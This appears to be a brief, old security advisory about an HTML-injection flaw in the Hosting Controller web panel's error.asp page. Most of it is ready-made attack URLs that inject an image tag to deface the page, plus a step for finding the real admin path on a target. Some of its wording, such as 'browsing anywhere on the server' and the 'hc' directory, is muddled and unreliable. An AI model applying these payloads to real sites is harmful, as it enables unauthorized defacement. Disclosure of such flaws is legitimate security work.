Vulnerability 


Hosting Controller has a security flaw which allows
outside attackers 
to Put her message with css

Sample scripts that allow browsing anywhere on the
server:
http://www.eg.com/admin/hosting/error.asp?error=<salam!>
http://www.eg.com/admin/hosting/error.asp?error=<IMG%20height=340%20src="http://eg.com/Deface/deface.jpg"%20width="596">
http://www.eg.com/hosting/error.asp?error=<IMG%20height=340%20src="http://eg.com/Deface/deface.jpg"%20width="596">

The directory "hc" is an example of the path to the
HostingController
script on the sample domain. The actual "hc" directory
name -- such as 
"admin" or "hostingcontroller" -- must be discovered
for each "eg.com" 
and 
replaced in the above URL scripts.
